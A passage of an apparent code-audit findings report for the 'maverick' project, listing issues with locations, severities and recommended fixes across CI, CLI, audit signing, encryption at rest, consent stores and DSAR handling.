| W5-61 | medium | Raised (finder cited evidence; skeptic pass not run) | testing | `.github/workflows/ci.yml:986` | Postgres-gated tests outside the CI postgres job's hard-coded file list never execute anywhere | Replace the explicit list with a marker (`@pytest.mark.postgres`) or `-k`/path glob (`packages/*/tests/test_*pg*.py`), and run `python -m pytest -m postgres` in the postgres job so every DSN-gated test executes. | S |

### ci/security-gates (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-6 | medium | Raised (finder cited evidence; skeptic pass not run) | ops | `.github/workflows/ci.yml:76` | CI `shell=True` confinement gate only scans apps/ and packages/ and matches a literal string | Extend the grep roots to `apps packages scripts benchmarks deploy sdks` (keep the /sandbox/ and /tests/ excludes) and match `shell\s*=\s*True` with a regex; consider also flagging `shell\s*=\s*[^F]` for manual review of non-literal values. | S |

### ci/test-shard (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-63 | medium | Raised (finder cited evidence; skeptic pass not run) | testing | `.github/actions/test-shard/action.yml:39` | About 30 optional-extra-gated tests (twilio, sympy, pandas, telegram, slack, matrix, chroma, langchain, qdrant, live smoke) are permanently skipped because the test job installs only core[openai] | Install the cheap extras in test-shard (`maverick-core[openai,math,pandas,chroma,langchain]`, `maverick-channels[telegram,slack,matrix,whatsapp]`), add a qdrant service like the postgres job for test_qdrant_isolation_live, and schedule test_live_smoke nightly with a CI secret. | S |

### cli/chat (2)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W3-45 | medium | Raised (finder cited evidence; skeptic pass not run) | correctness | `packages/maverick-core/maverick/cli/__init__.py:4001` | `maverick chat` hard-codes --max-dollars=2.0, silently overriding the operator's `[budget] max_dollars` cap | Change the option to `default=None` (show_default of the config value in help) so budget_from_config's precedence works, exactly as `start` and `resume` already do. | S |
| W3-68 | low | Raised (finder cited evidence; skeptic pass not run) | ux | `packages/maverick-core/maverick/cli/__init__.py:4093` | `chat` prints raw `str(e)` for per-turn failures, bypassing the humaniser and secret scrub that wrap every other run path | Print `_humanize_run_error(e)` (and route through secrets.scrub) in both loops; keep the `continue`. | S |

### cli/cost (2)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W3-48 | medium | Raised (finder cited evidence; skeptic pass not run) | data-integrity | `packages/maverick-core/maverick/cli/__init__.py:7008` | `maverick cost` lifetime totals are silently truncated to the 10,000 most recent episodes while `budget`/`spend` use a SQL SUM | Use total_spend() for the summary path (with an optional month filter pushed into SQL), and stream episodes with pagination for --csv; print a 'truncated to N' note if any cap is retained. | S |
| W3-64 | low | Raised (finder cited evidence; skeptic pass not run); prior | docs-accuracy | `packages/maverick-core/maverick/cli/__init__.py:7000` | `cost --model` help still advertises 'Filter to one model id.' although the option now unconditionally errors | Either remove/hide the option (hidden=True, deprecated help) or implement it by recording model_id on episodes as the prior audit suggested. | S |

### cli/debate+plan-reflect+watch (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W3-46 | medium | Raised (finder cited evidence; skeptic pass not run) | correctness | `packages/maverick-core/maverick/cli/__init__.py:4239` | `debate`, `plan-reflect` and `watch --run` build a raw Budget(), ignoring every `[budget]` config cap (dollars, wall-clock, tool calls) | Replace with `budget_from_config(task_class=..., max_dollars=max_dollars)` and make the --max-dollars default None (or show the config value) in all three commands. | S |

### cli/global-options (3)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W3-47 | medium | Raised (finder cited evidence; skeptic pass not run) | correctness | `packages/maverick-core/maverick/cli/__init__.py:773` | Global `--db` is silently ignored by `spend`, `costs`, `diag health`, `diag cost-by-tag` and `schema-plan`; `workforce-graduation` defines a conflicting local `--db` | Pass `ctx.obj['db']` (add @click.pass_context) in the five commands; drop the local `--db` on workforce-graduation in favour of the global one. Add a test asserting every command that opens the world honours ctx.obj['db'] (grep for `open_world()` with no args in cli/). | S |
| W3-69 | low | Raised (finder cited evidence; skeptic pass not run) | ux | `packages/maverick-core/maverick/cli/__init__.py:341` | Global `--db`/`--model` must precede the subcommand (`maverick status --db x` is rejected) and no doc shows the placement | Either register `--db`/`--model` on the run-driving subcommands too (a shared decorator writing ctx.obj), or add them to the epilog/README with the required ordering. | S |
| W3-57 | low | Raised (finder cited evidence; skeptic pass not run) | ux | `packages/maverick-core/maverick/cli/__init__.py:388` | A typo'd global `--db` path silently creates a new empty database (and its parent directory) instead of erroring | When `--db` is given explicitly and the file does not exist, refuse for read-only commands ('no database at X; pass --create or run a goal') and only create it for `start`/`chat`/`fact`. | S |

### cli/mcp (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W3-44 | medium | Raised (finder cited evidence; skeptic pass not run) | reliability | `packages/maverick-core/maverick/cli/__init__.py:2920` | `maverick mcp` crashes with a raw traceback when MAVERICK_REQUIRE_ENTERPRISE=1 and a guarantee fails; `serve` handles the same error cleanly | Mirror `serve`: `try: require_enterprise_or_die() except EnterpriseRequiredError as e: click.echo(e.summary, err=True); sys.exit(3)`. Consider a shared helper used by serve/mcp/dashboard. | S |

### cli/share (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W3-43 | medium | Raised (finder cited evidence; skeptic pass not run) | reliability | `packages/maverick-core/maverick/cli/__init__.py:3937` | `maverick share` dumps a raw httpx traceback on any GitHub HTTP/network error and never checks the goal exists before uploading | Wrap `share` with @_humane_errors (or catch httpx.HTTPError/OSError explicitly) and print a one-line 'GitHub rejected the upload (403): check GITHUB_TOKEN scopes'. Before building the payload, `world.get_goal(goal_id)` and exit 2 with 'no such goal' like `export` does. | S |

### core/ai_* (cross-cutting) (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W4-36 | medium | Raised (finder cited evidence; skeptic pass not run) | duplication | `packages/maverick-core/maverick/ai_bank_mrm.py:266` | Every ai_* module carries its own divergent copy of the same helper family (canonical JSON, digests, timestamps, tenant refs, feature gates): 33 files x ~10 helpers, dozens of distinct bodies | Introduce maverick/governance_common.py (canonical_json(bytes-bounded), sha256, digest(), timestamp(), token(), tenant_ref(), feature_gate(section)) with one tested implementation and a documented canonicalisation (ensure_ascii, encoding, bound), then migrate modules incrementally; add a CI grep/AST check that forbids new private copies of these names in ai_*.py. | M |

### core/ai_cost_collectors (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W4-31 | medium | Raised (finder cited evidence; skeptic pass not run) | security | `packages/maverick-core/maverick/ai_cost_collectors.py:809` | Azure cost collector's default HTTP transport follows redirects and forwards the bearer token, unlike the OpenAI collector which explicitly disables redirects | Build the opener with a redirect-refusing HTTPRedirectHandler (reuse ai_cost_openai._NoRedirectHandler or move it to a shared helper), treat any 3xx as AICostCollectorProtocolError, and add a FakeAzureTransport test that returns 302 and asserts no follow. Consider routing through tools._ssrf.safe_client like ai_inventory does. | S |

### core/ai_runtime_guardrails (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W4-32 | medium | Raised (finder cited evidence; skeptic pass not run) | ops | `packages/maverick-core/maverick/ai_runtime_guardrails.py:439` | Runtime guardrails silently block 100% of traffic with an opaque 'shield/<stage>/error' rule when agent-shield is not installed; no preflight or distinct signal | In require_enabled()/_feature_flags (or maverick doctor and the wizard step) verify `import maverick_shield` succeeds and fail fast with a configuration error naming the missing package; emit a distinct rule id (e.g. 'shield/unavailable') and a log line when the factory raises ImportError so the outage is diagnosable; add a test for the shield-absent path. | S |

### core/air_gap + observability (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-102 | medium | Raised (finder cited evidence; skeptic pass not run); prior | docs-accuracy | `packages/maverick-core/maverick/air_gap.py:161` | Air-gap telemetry audit sees only config: MAVERICK_SENTRY_DSN / MAVERICK_OTEL_EXPORTER env (which observability.py prefers) pass clean, and those exporters use urllib3/grpc stacks the egress guard cannot stop | Have _audit_telemetry also inspect MAVERICK_SENTRY_DSN, MAVERICK_OTEL_EXPORTER/ENDPOINT, MAVERICK_SIEM_TOKEN and MAVERICK_LICENSE_API from os.environ (with a flag to audit env), and document that Sentry/OTLP-gRPC bypass egress_guard so enterprise mode should refuse to initialise them unless their host is allow-listed. | S |

### core/audit signing + trust receipts (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-52 | medium | Raised (finder cited evidence; skeptic pass not run) | performance | `packages/maverick-core/maverick/audit/signing.py:526` | KMS-wrapped audit key is unwrapped on every call: 2 KMS Decrypt round-trips per AuditSigner construction and 1 per active_key_is_offhost() (trust receipts, per-request API) | Cache the unwrapped keypair (and a negative result with a short TTL) in a module-level cache like _INJECTED_KEYPAIR_CACHE; compute active_key_is_offhost from the cached selection made at signer init. | S |

### core/audit signing key custody (2)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-53 | medium | Raised (finder cited evidence; skeptic pass not run); prior | security | `packages/maverick-core/maverick/audit/signing.py:471` | Off-host audit key custody is still opt-in outside enterprise mode; default install signs with a co-located key while README still headlines 'Tamper-evident' | Either flip require_offhost_signing() to default-on whenever a KMS/injected source is configured or `maverick launch-check` is used (fail the launch row otherwise), and qualify README/docs claims with the custody condition; or keep default-off but add a launch-check row 'audit key custody: co-located (integrity only)'. | S |
| W2-47 | medium | Raised (finder cited evidence; skeptic pass not run) | security | `packages/maverick-core/maverick/audit/signing.py:511` | A configured KMS-wrapped audit signing key silently downgrades to a freshly generated co-located on-disk key when the KMS unwrap fails (non-enterprise) | Treat an explicitly configured off-host source as intent: if MAVERICK_AUDIT_SIGNING_KEY or _WRAPPED is set and cannot be used, raise OffHostSigningRequiredError (or at least refuse to generate a new local key) regardless of enterprise mode; make require_offhost_signing() return True whenever either env var is present. | S |

### core/audit verification (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-50 | medium | Raised (finder cited evidence; skeptic pass not run) | correctness | `packages/maverick-core/maverick/audit/signing.py:968` | verify_chain(pubkey_hex) accepts a single trusted key, so an externally-held pubkey cannot verify any chain that spans an audit key rotation | Accept a key registry (dict key_id->pubkey_hex, or a list) in verify_chain/verify_anchors/collect_node and `maverick audit verify --pubkey` (repeatable); select by row key_id and report 'untrusted_key_id' distinctly from bad_signature. trusted_audit_public_keys() already builds the right shape. | S |

### core/audit/forwarder (2)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-97 | medium | Raised (finder cited evidence; skeptic pass not run) | data-integrity | `packages/maverick-core/maverick/audit/forwarder.py:123` | SIEM HTTP forwarder follows redirects with urllib: bearer forwarded cross-host / downgraded to http, and 301/302 turns the POST into a GET so the batch is dropped but counted as delivered | Install a custom HTTPRedirectHandler in _post_http_batch that raises on any redirect (SIEM collectors should not redirect), or at minimum refuses scheme downgrade/cross-host and re-POSTs the body on 307/308 only; add a test with a 302-to-http:// stub asserting a RuntimeError and no bearer on the second hop. | S |
| W2-108 | improvement | Raised (finder cited evidence; skeptic pass not run) | ops | `packages/maverick-core/maverick/audit/forwarder.py:32` | SIEM forwarder offers no TLS syslog transport: tcp:// is always plaintext and there is no tls:// / tcp+tls:// scheme | Add a 'tls' (or 'tcp+tls') scheme that wraps _send_tcp's socket with ssl.create_default_context() (optional client cert via [audit] siem_tls_cert/key, CA via siem_tls_ca), fail closed on verification errors, and mention it in the docstring and `maverick audit forward --help`. | S |

### core/compliance (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W4-66 | medium | Raised (finder cited evidence; skeptic pass not run); prior | docs-accuracy | `packages/maverick-core/maverick/compliance.py:145` | compliance_report() still hardcodes 'Audit logging (record-keeping)' as active without probing the writer (unresolved prior finding) | Probe writability the way the signing check does: attempt a throwaway append to the active audit directory (or call the writer's health probe) and report 'action_needed' with the error detail when it fails. | S |

### core/config tests (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-58 | medium | Raised (finder cited evidence; skeptic pass not run) | testing | `packages/maverick-core/tests/test_provider_base_url_plumbing.py:23` | Provider-environment tests clear a hand-copied subset of env vars and miss ANTHROPIC_BASE_URL/OPENAI_BASE_URL (4 of 6 baseline failures) | Add one autouse fixture in the root conftest that `monkeypatch.delenv`s every name in `maverick.config.PROVIDER_CREDENTIAL_ENV_VARS + PROVIDER_BASE_URL_ENV_VARS` plus MAVERICK_MODEL_OVERRIDE, and delete the three hand-maintained lists (tests that need a provider set it explicitly). | S |

### core/config-lint (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-114 | medium | Raised (finder cited evidence; skeptic pass not run) | correctness | `docs/configuration.md:544` | docs/configuration.md documents a `[suites]` section that the runtime reads but `maverick config-lint`/`migrate` flag as unknown | Add `suites` to `KNOWN_SECTIONS`; add a test asserting every `[section]` in docs/configuration.md is in KNOWN_SECTIONS and (at least) every section wizard-written is documented; consider generating the 'Full schema' block from the registry. | S |

### core/consent_* stores (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W4-18 | medium | Raised (finder cited evidence; skeptic pass not run) | ops | `packages/maverick-core/maverick/consent_preferences.py:731` | Immutable idempotency, audit and event tables grow without bound (no-delete triggers, no purge) across five consent stores | Add created_at-based retention purges for idempotency rows (e.g. > 30 days, the longest sensible retry window) implemented as an explicit maintenance method that temporarily drops/recreates the trigger or moves the table out of the immutable set; keep audit chains immutable but document growth and provide archival/export + compaction. | M |

### core/consent_application_scanner (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W4-14 | medium | Raised (finder cited evidence; skeptic pass not run) | security | `packages/maverick-core/maverick/consent_application_scanner.py:345` | _safe_xml DTD/ENTITY guard is bypassed by BOM-less UTF-16 manifests (entities are expanded) | Decode to text first (detect BOM/encoding declaration, reject non-UTF-8/UTF-16-with-BOM), run the DOCTYPE/ENTITY check on the decoded string, or use a parser with entity expansion disabled (defusedxml / XMLParser with forbid_dtd). Add a UTF-16 test vector. | S |

### core/consent_bulk_jobs (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W4-17 | medium | Raised (finder cited evidence; skeptic pass not run) | reliability | `packages/maverick-core/maverick/consent_bulk_jobs.py:1079` | Bulk-job docstring promises 'successful items are never repeated', but the executor runs outside the recording transaction (at-least-once) | Document at-least-once semantics and require executors to be idempotent on item_id (pass the item id as the downstream idempotency key), or on retry treat a ConsentConflict whose current state already matches the requested mutation as success; fix the docstring. | M |

### core/consent_delivery (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W4-6 | medium | Raised (finder cited evidence; skeptic pass not run) | data-integrity | `packages/maverick-core/maverick/consent_delivery.py:1846` | Dead-lettered delivery message blocks all later messages for the same profile/destination; expired dead letters are never cancelled, so newer consent changes silently expire | Either (a) exclude dead_letter from the ordering guard once its retention has lapsed and cancel it (with audit) in the same maintenance pass as expired queued rows, or (b) expose dead-letter age/HOL-blocked counts in counts()/readiness so operators are alerted; plus a test proving a withdrawal enqueued after a dead letter is still delivered after replay. | M |

### core/consent_delivery_bridge (2)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W4-7 | medium | Raised (finder cited evidence; skeptic pass not run) | reliability | `packages/maverick-core/maverick/consent_delivery_bridge.py:225` | Consent-delivery bridge has no poison-event handling: one unbridgeable outbox event stalls the whole destination subscription forever | On ConsentDeliveryBridgeIntegrityError/ValidationError for a single event, ack it as 'skipped_invalid' with an audit record (or a bridge dead-letter table) and continue; surface 'stalled_at_sequence' in the sync result and dashboard readiness. | M |
| W4-19 | medium | Raised (finder cited evidence; skeptic pass not run) | compliance | `packages/maverick-core/maverick/consent_delivery_bridge.py:235` | Subject erasure, unlink and identity events are never forwarded to delivery destinations (bridge only forwards preferences.changed) | Map profile.subject_deleted -> profile_erased and profile.linked/unlinked -> profile_linked ConsentChange envelopes in ConsentDeliveryBridge._change (or an explicit adapter contract), and surface 'events_skipped' by type in the dashboard; or remove the unused kinds and document that erasure propagation is out of scope. | M |

### core/consent_global_opt_out (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W4-15 | medium | Raised (finder cited evidence; skeptic pass not run) | correctness | `packages/maverick-core/maverick/consent_global_opt_out.py:611` | Global Opt-Out configuration history hard-fails at 128 events, making a frequently edited configuration impossible to revoke or purge | Allow lifecycle transitions (revoked/purged) regardless of history length, or roll/compact history (keep a digest chain head plus the last N events) instead of failing; add a test at the bound. | S |

### core/consent_registry (5)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W4-9 | medium | Raised (finder cited evidence; skeptic pass not run) | data-integrity | `packages/maverick-core/maverick/consent_registry.py:186` | Webhook/import recorded_at has no upper bound: a far-future timestamp permanently pins a consent status | Reject or clamp recorded_at > now + tolerance (e.g. 300 s) in record_consent; add a test. | S |
| W4-10 | medium | Raised (finder cited evidence; skeptic pass not run) | correctness | `packages/maverick-core/maverick/consent_registry.py:308` | export_receipts claims 'newest last-activity first' but sorts only the first `limit` rows of store order, not the newest N | Sort/scan the full bounded window (_SCAN_LIMIT, as subject_preferences does) and slice to limit, or add an index/ordering on last_recorded_at in the backend; document the truncation flag in the export. | S |
| W4-8 | medium | Raised (finder cited evidence; skeptic pass not run) | data-integrity | `packages/maverick-core/maverick/consent_registry.py:566` | OneTrust import silently records unparseable dates as 'now', defeating the backdate protection the module relies on | Treat an unparseable non-empty date as a skip (count under skipped with a reason), or try a small set of documented OneTrust formats; never fall back to ingest time for historical rows. Add a test with a non-ISO date. | S |
| W4-24 | low | Raised (finder cited evidence; skeptic pass not run) | performance | `packages/maverick-core/maverick/consent_registry.py:275` | subject_preferences / notice_coverage / consent_posture scan the whole 10k-record store per call | Add a subject_digest index/lookup in GovernedRecordStore (by-prefix or secondary key) and use it here; raise _MAX_RECORDS once lookups are indexed. | M |
| W4-23 | low | Raised (finder cited evidence; skeptic pass not run) | correctness | `packages/maverick-core/maverick/consent_registry.py:683` | Webhook replay inside the 300 s window appends duplicate history events (docstring says replay is a no-op) | Skip appending when the last history entry has an identical receipt_sha256 (or dedupe on receipt_sha256 within the retained window); fix the docstring. | S |

### core/consent_scanner (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W4-13 | medium | Raised (finder cited evidence; skeptic pass not run) | performance | `packages/maverick-core/maverick/consent_scanner.py:722` | Scanner launches a fresh SOCKS proxy and Chromium browser for every page (max_pages up to 10,000) | Launch the proxy + browser once per scan (or per N pages) and create a fresh BrowserContext per page; keep the per-page route/SSRF admission logic unchanged. | M |

### core/consent_standards (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W4-3 | medium | Raised (finder cited evidence; skeptic pass not run) | correctness | `packages/maverick-core/maverick/consent_standards.py:969` | GPP v1 header codec uses a non-IAB canonical form: real IAB header strings (DBABMA, DBACNYA, DBABLA) are rejected | Match the IAB spec: pad the bit string to a multiple of 8 before base64url (and accept either padding on decode, or at least the byte-padded form), replace the self-generated 'golden vectors' with the IAB spec examples (DBABMA, DBACNYA, DBABLA, DBABjw...), and fix the test at line 410. | S |

### core/consumer_trust_center (2)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W4-91 | medium | Raised (finder cited evidence; skeptic pass not run) | docs-accuracy | `packages/maverick-core/maverick/consumer_trust_center.py:1298` | 'Signed' trust-center exports are HMAC-SHA256 MACs that only the deployment can verify — not independently verifiable by the consumer or auditor they are exported to | Either sign exports with the deployment's Ed25519 audit key (reuse audit.signing) and document the public-key verification path, or rename the fields/docs to 'integrity MAC' and state that verification is deployment-internal. | M |
| W4-101 | low | Raised (finder cited evidence; skeptic pass not run) | security | `packages/maverick-core/maverick/consumer_trust_center.py:1361` | `ConsumerTrustCenterStore.verify_export` feeds attacker-supplied key references into the signing-key resolver | Pin verification to the store's own `_key_ref` (and tenant) exactly as `verify_signed_metadata` does, or validate the ref against an allow-list before calling the resolver. | S |

### core/consumer_trust_center_authority (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W4-90 | medium | Raised (finder cited evidence; skeptic pass not run) | ops | `packages/maverick-core/maverick/consumer_trust_center_authority.py:2320` | Trust-center authority exports become unverifiable and unreadable after rotating `signing_key_ref` | Resolve the key by the export's own `signing_key_ref` through the injected resolver (which already takes a ref argument) with an allow-list of retired refs, or persist the key ref generation alongside the export and support `historical_signing_key_refs`. | S |

### core/control_plane_lease (2)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W4-64 | medium | Raised (finder cited evidence; skeptic pass not run) | reliability | `packages/maverick-core/maverick/control_plane_lease.py:13` | Single-writer control-plane lease is only acquired by the dashboard; CLI goal runs and workers append to the same hash-chained ledgers unguarded | Decide the contract explicitly: either (a) have every process that writes the chained ledgers take a shared/role lease (and have the dashboard refuse only a second 'control-plane' role), or (b) document that the lease covers only dashboard replicas and that per-write cross_process_lock plus tip-read-under-lock is what actually protects the chains, and delete the 'interleave valid records' warning. Add a test that runs a CLI audit write while the dashboard lease is held and asserts the chosen behaviour. | M |
| W4-63 | medium | Raised (finder cited evidence; skeptic pass not run) | docs-accuracy | `packages/maverick-core/maverick/control_plane_lease.py:51` | control_plane_lease docstring claims silent no-op flock 'fails closed'; the code can only fail closed when the OS returns an error | Either soften the docstring to 'fails closed only when the kernel reports that locking is unsupported', or actually demonstrate exclusion at startup (fork/spawn a short-lived child that attempts LOCK_EX\|LOCK_NB on the same path and must FAIL; if it succeeds, raise LeaseUnavailable). Surface the result on /readyz posture. | S |

### core/crypto_at_rest (3)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-48 | medium | Raised (finder cited evidence; skeptic pass not run) | data-integrity | `packages/maverick-core/maverick/crypto_at_rest.py:698` | At-rest rotation keyring selects the active key by file mtime; a backup/restore (or same-tick rotate) silently reactivates an old key | Persist an explicit active-key pointer file in at_rest.d (as signing._save_keypair does) written by rotate_at_rest_key(); fall back to mtime only for legacy rings; have backup/restore preserve it. | S |
| W2-49 | medium | Raised (finder cited evidence; skeptic pass not run) | data-integrity | `packages/maverick-core/maverick/crypto_at_rest.py:802` | Decrypt (read) path silently mints a new at_rest.key when the injected env key is absent, forking key material on a misconfigured node | Split _load_or_create_key into load (read paths, raises EncryptionUnavailable if absent) and load_or_create (seal path only); never create key material on a read. Consider refusing auto-generation when MAVERICK_ENCRYPTION_KEY_DIGEST is set (operator has declared an external key). | S |
| W2-67 | improvement | Raised (finder cited evidence; skeptic pass not run) | security | `packages/maverick-core/maverick/crypto_at_rest.py:783` | Random 96-bit GCM nonces under a long-lived at-rest key with no usage accounting or rotation cadence guidance | Document a rotation cadence and add a doctor/launch-check row on key age; longer-term use a nonce-misuse-resistant AEAD (AES-GCM-SIV or XChaCha20-Poly1305 via cryptography) for v3 blobs. | M |

### core/crypto_at_rest + encryption_migrate (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-55 | medium | Raised (finder cited evidence; skeptic pass not run) | security | `packages/maverick-core/maverick/encryption_migrate.py:135` | At-rest key rotation is additive only: no re-encryption path exists, so every retired key must be kept (and remains able to decrypt) forever | Add `maverick encryption rewrap [--retire <keyid>]` that re-seals sealed columns/memory files/audit segments under the active key (reusing migrate's column list + sealing.encode_segment), then allows deleting the old key file; add the same for tenant DEK rotation. | M |

### core/dsar_fulfillment (2)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W4-61 | medium | Raised (finder cited evidence; skeptic pass not run) | reliability | `packages/maverick-core/maverick/dsar_fulfillment.py:330` | Public /dsar/response/{token} lookup runs with no tenant binding in token-auth deployments, so tenant-scoped fulfillment records are never found | Persist the tenant id on the fulfillment record and index the token digest -> (tenant, record id) in a deployment-global (authority_scope="deployment_global") lookup table written at prepare_response, then bind that tenant (set_tenant) before loading the record; this also removes the O(n) scan. Add a dashboard test that mints a link under a bound tenant with a dashboard token configured and fetches it unauthenticated. | M |
| W4-60 | medium | Raised (finder cited evidence; skeptic pass not run) | compliance | `packages/maverick-core/maverick/dsar_fulfillment.py:365` | Public DSAR response assembles the subject export with no channel and no tenant, silently delivering an empty bundle | Store channel (and tenant) on the fulfillment record at open_fulfillment time (require the DSAR record to carry a channel/user pair or an explicit mapping step recorded by a human), pass channel=/tenant= into export_subject_data, and refuse to mint/serve a response link when the subject cannot be resolved (or surface a 'platform_holdings: unresolved' marker in the response instead of empty arrays). Add a test with a subject_id present on two channels asserting the link is refused rather than served empty. | M |

### core/egress_contract (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-93 | medium | Raised (finder cited evidence; skeptic pass not run) | docs-accuracy | `packages/maverick-core/maverick/egress_contract.py:19` | egress_contract census is blind to sockets, smtplib, websockets, grpc, boto3 and SDK-internal aiohttp, and marks audit/forwarder.py (raw TCP/UDP) as COVERED — contradicting its own docstring | Extend _HTTP_CALLS with socket.create_connection/socket.socket/socket.sendto, smtplib.SMTP/SMTP_SSL, imaplib.IMAP4_SSL, websockets.connect, grpc.insecure_channel/secure_channel/aio.*, boto3.client/resource, discord.Client, sentry_sdk.init, urllib3.PoolManager (mapped to non-covered library names), record the resulting modules in KNOWN_UNCOVERED with reasons, and rewrite the docstring to list exactly what the census can and cannot see. | S |

### core/erasure_verify (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W4-62 | medium | Raised (finder cited evidence; skeptic pass not run) | correctness | `packages/maverick-core/maverick/erasure_verify.py:492` | erasure_verify.differential() treats an unchecked store as zero, so an INDETERMINATE 'after' report can yield verified=True | Make differential() take the full verify_erasure reports (or an explicit `indeterminate`/`errors` input) and force verified=False when any store is unchecked or when a key present in `before` is absent from `after`; wire it into `maverick erase` (capture counts pre-delete) / `erase-verify`, or remove the claim from FEATURES.md. | S |

### core/github_app + dashboard webhook (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-71 | medium | Raised (finder cited evidence; skeptic pass not run) | concurrency | `packages/maverick-core/maverick/github_app.py:337` | GitHub issue webhook runs blocking git subprocesses (up to 120s each) directly on the dashboard event loop | Run clone_repo and the git/gh steps via asyncio.to_thread (or make process_issue's git phases sync helpers executed with run_in_threadpool), keeping only run_goal awaited. Alternatively enqueue the whole issue->PR flow as a JobQueue job so it runs in a worker process. | S |

### core/github_app + dashboard/webhooks (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-87 | medium | Raised (finder cited evidence; skeptic pass not run) | performance | `packages/maverick-core/maverick/github_app.py:337` | GitHub issue→PR webhook runs blocking git subprocesses inside an async coroutine on the dashboard event loop | Wrap the git calls in `await asyncio.to_thread(subprocess.run, ...)` or switch to `asyncio.create_subprocess_exec` with `asyncio.wait_for(..., _GIT_TIMEOUT)`; do the same in coding_mode.evaluate_candidate; enable `ASYNC` in ruff so the pattern cannot return. | S |

### core/governance-suite (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W4-80 | medium | Raised (finder cited evidence; skeptic pass not run) | duplication | `packages/maverick-core/maverick/trc_continuous_evidence.py:205` | 13 modules each carry private, divergent copies of the same validation/canonicalization scaffolding (~2,400 lines) | Extract a `maverick/governed_store_common.py` (canonical JSON, digest, id/tenant/timestamp/integer validators parameterised by the module's error class, SQLite connect/begin/operation/record_operation/audit-chain helpers) and migrate the 13 modules to it; add a CI check that greps for re-declared `def _canonical(` in these modules. | M |

### core/governance_agents (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W4-65 | medium | Raised (finder cited evidence; skeptic pass not run) | correctness | `packages/maverick-core/maverick/governance_agents.py:3043` | GovernanceAgentStore.list_runs orders by revision count instead of recency (runtime string-replace of a non-existent column) | Add a persisted updated_at (or created_at) column to runs (with the schema bump handled by a real migration, see the schema-versioning finding) and ORDER BY updated_at DESC, run_id; or at minimum order by the payload's generated_at extracted into a column. Remove the string .replace(). Add a test creating 3 runs where the oldest has the most revisions and asserting list_runs order. | S |

### core/grc-suite (cross-module) (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
